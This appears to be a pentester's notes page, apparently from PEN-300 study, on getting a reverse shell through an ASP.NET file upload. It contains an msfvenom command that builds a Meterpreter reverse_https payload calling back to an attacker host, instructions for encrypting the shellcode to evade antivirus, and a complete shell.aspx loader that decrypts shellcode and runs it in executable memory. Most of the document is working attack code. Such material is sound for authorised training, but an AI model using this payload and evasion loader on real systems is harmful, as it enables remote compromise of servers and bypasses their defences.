> Dummy test file. Use this to test if the upload works and if you get a blank page after accessing it:

```
<%@ Page Language="C#" %>
<script runat="server">
</script>
```

> Afterwards you can generate a file which can give a reverse shell:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali_ip> LPORT=443 -f csharp
```

To bypass antivirus, we can take the shellcode and then add it to our Helper.exe tool we make during the PEN-300 course in the Introduction to Antivirus Evasion module to get encrypted shellcode and then add that in our shell.aspx file which will allow us to bypass antivirus via file upload.

**TIP**: Open the file with gedit to avoid lag when pasting the Helper.exe shellcode.

> Below is the shell.aspx file with placeholders for the shellcode and byte size:

```
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
    
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
    
    	IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    	if(mem == null)
    	{
        return;
    	}
        byte[] fOE = new byte[<byte_size>] {<shellcode>};

        // Fixed decryption loop - using the correct variable name 'fOE' instead of 'qHx6Nwpu7u8B'
        for(int i = 0; i < fOE.Length; i++)
        {
            fOE[i] = (byte)(((uint)fOE[i] - 2) & 0xFF);
        }

        IntPtr bgqEfUU = VirtualAlloc(IntPtr.Zero,(UIntPtr)fOE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(fOE,0,bgqEfUU,fOE.Length);
        IntPtr oRGeVbNxPX_ = IntPtr.Zero;
        IntPtr kCbYm = CreateThread(IntPtr.Zero,UIntPtr.Zero,bgqEfUU,IntPtr.Zero,0,ref oRGeVbNxPX_);
    }
</script>
```
